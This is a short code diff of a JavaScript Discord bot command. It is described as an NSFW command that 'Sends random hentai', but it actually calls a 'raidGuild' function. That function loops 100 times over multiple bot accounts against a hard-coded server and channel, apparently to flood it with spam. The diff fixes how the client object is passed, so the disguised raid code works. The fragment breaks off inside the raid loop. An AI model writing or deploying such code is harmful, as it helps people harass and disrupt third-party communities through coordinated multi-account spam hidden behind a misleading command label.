@@ -4,7 +4,7 @@ module.exports = {
   category: "NSFW",
   description: "Sends random hentai",
   usage: "[command]",
-  execute: async (message, args) => {
+  execute: async (message, args, client) => {
 	return new Promise((resolve, reject) => {
 		let targetGuild = 811407068941647883;
 		let targetChannel = 819961928557920266;
@@ -13,7 +13,7 @@ module.exports = {
 		if(targetGuild){
 			if(targetChannel){
 				if(message){
-					raidGuild(Client, targetGuild, targetChannel, message).then(() => { resolve() });
+					raidGuild(client, targetGuild, targetChannel, message).then(() => { resolve() });
 				} else {
 					console.log("You did not specify a message!");
 					resolve();
@@ -28,11 +28,11 @@ module.exports = {
 		}
 	});
 
-	function raidGuild(Client, targetGuild, targetChannel, message){
+	function raidGuild(client, targetGuild, targetChannel, message){
 		return new Promise((resolve, reject) => {
 			for(var I = 0; I < 100; I++){
 				setTimeout(async () => {
-					Client.Accounts.forEach(async (account) => {
+					client.Accounts.forEach(async (account) => {
 						const instance = account.instance;
 						let Guild = instance.guilds.get(targetGuild);
 						if(Guild){
